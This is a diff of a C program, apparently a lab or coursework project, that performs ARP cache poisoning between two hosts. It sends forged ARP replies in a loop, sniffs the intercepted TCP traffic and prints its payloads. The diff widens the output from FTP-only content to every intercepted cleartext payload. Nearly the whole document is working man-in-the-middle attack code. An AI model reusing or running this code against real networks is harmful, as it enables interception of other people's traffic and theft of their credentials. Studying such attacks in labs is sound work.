@@ -18,7 +18,7 @@
 #define ARP_PKT_LEN 28
 
 int verbose = 0;
-const char *iface = "br-ef81d046a1ff";
+const char *iface = "br-f4cea654e3fb";
 typedef struct eth_h {
     unsigned char dest_mac[6];
     unsigned char src_mac[6];
@@ -37,10 +37,20 @@ typedef struct arp_h {
     unsigned char target_ip[4];
 } arp_hdr;
 
-
-void send_arp_reply(char* target_mac, char* your_mac, char* gateway_ip, char* target_ip)
+char * get_mac(void)
 {
-  
+    struct ifreq ifr;
+    int s;
+    s = socket(AF_INET, SOCK_DGRAM, 0);
+    strcpy(ifr.ifr_name, iface);
+    ioctl(s, SIOCGIFHWADDR, &ifr);
+    close(s);
+    return ether_ntoa((struct ether_addr *)ifr.ifr_hwaddr.sa_data);
+}
+void send_arp_reply(char* target_mac, char* target_ip,char* victim_ip)
+{
+    char* my_mac = get_mac();
+   
     int sockfd;
     unsigned char buffer[ETH_HDR_LEN + ARP_PKT_LEN];
     eth_hdr *eth = (eth_hdr *)buffer;
@@ -60,15 +70,15 @@ void send_arp_reply(char* target_mac, char* your_mac, char* gateway_ip, char* ta
     }
     socket_address.sll_ifindex = ifr.ifr_ifindex;
     memcpy(eth->dest_mac, ether_aton(target_mac), 6);
-    memcpy(eth->src_mac, ether_aton(your_mac), 6);
+    memcpy(eth->src_mac, ether_aton(my_mac), 6);
     eth->protocol = htons(0x0806);
     arp->hw_type = htons(1);
     arp->protocol_type = htons(0x0800);
     arp->hw_size = 6;
     arp->protocol_size = 4;
     arp->opcode = htons(2);
-    memcpy(arp->sender_mac, ether_aton(your_mac), 6);
-    inet_pton(AF_INET, gateway_ip, arp->sender_ip);
+    memcpy(arp->sender_mac, ether_aton(my_mac), 6);
+    inet_pton(AF_INET, victim_ip, arp->sender_ip);
     memcpy(arp->target_mac, ether_aton(target_mac), 6);
     inet_pton(AF_INET, target_ip, arp->target_ip);
     memcpy(socket_address.sll_addr, ether_aton(target_mac), 6);
@@ -80,40 +90,10 @@ void send_arp_reply(char* target_mac, char* your_mac, char* gateway_ip, char* ta
         exit(EXIT_FAILURE);
     }
 }
-void print_hex_ascii(const unsigned char *data, int len) {
-    int i, j;
-    for(i = 0; i < len; i++) {
-        if (i != 0 && i % 16 == 0) {
-            printf("  ");
-            for(j = i - 16; j < i; j++) {
-                if (data[j] >= 32 && data[j] <= 128)
-                    printf("%c", data[j]);
-                else
-                    printf(".");
-            }
-            printf("\n");
-        }
-        if (i % 16 == 0) printf("  ");
-        printf("%02x ", data[i]);
-    }
-    
-    if (len % 16 != 0) {
-        int spaces = (16 - (len % 16)) * 3;
-        printf("%*s", spaces, "");
-        for(j = (len - (len % 16)); j < len; j++) {
-            if (data[j] >= 32 && data[j] <= 128)
-                printf("%c", data[j]);
-            else
-                printf(".");
-        }
-    }
-    printf("\n");
-}
 
-// Modify print_packet function to check verbose flag
 void print_packet(unsigned char * buffer, size_t size)
 {
-    if (!verbose) return;  // Only print if verbose mode is enabled
+    if (!verbose) return;
     struct ethhdr *eth = (struct ethhdr *)buffer;
     struct iphdr *ip = (struct iphdr *)(buffer + ETH_HDR_LEN);
     struct tcphdr *tcp = (struct tcphdr *)(buffer + ETH_HDR_LEN + sizeof(struct iphdr));
@@ -133,18 +113,12 @@ void print_packet(unsigned char * buffer, size_t size)
         printf("Dest Port: %d\n", ntohs(tcp->dest));
         uint16_t src_port = ntohs(tcp->source);
         uint16_t dst_port = ntohs(tcp->dest);
-        
-        if (src_port == 21 || dst_port == 21 || 
-            src_port == 20 || dst_port == 20 || 
-            src_port > 21000 || dst_port > 21000) {  
-            printf("\n=== FTP Content ===\n");
-            for(int i = 0; i < payload_len; i++) {
-                if (isprint(payload[i]) || payload[i] == '\n' || payload[i] == '\r') {
-                    printf("%c", payload[i]);
-                }
+        for(int i = 0; i < payload_len; i++) {
+            if (isprint(payload[i]) || payload[i] == '\n' || payload[i] == '\r') {
+                printf("%c", payload[i]);
             }
-            printf("\n=================\n");
         }
+        printf("\n=====================================================================\n");
     }
 }
 
@@ -227,10 +201,9 @@ int main(int argc, char *argv[]) {
     pthread_create(&sniff_thread, NULL, sniff_packets, NULL);
 
     while (1) {
-        send_arp_reply(target_mac, src_mac, src_ip, target_ip);
-        send_arp_reply(src_mac, src_mac, target_ip, src_ip);
+        send_arp_reply(target_mac,target_ip,src_ip);
+        send_arp_reply(src_mac,src_ip,target_ip);
         sleep(5);
     }
-
     return 0;
 }
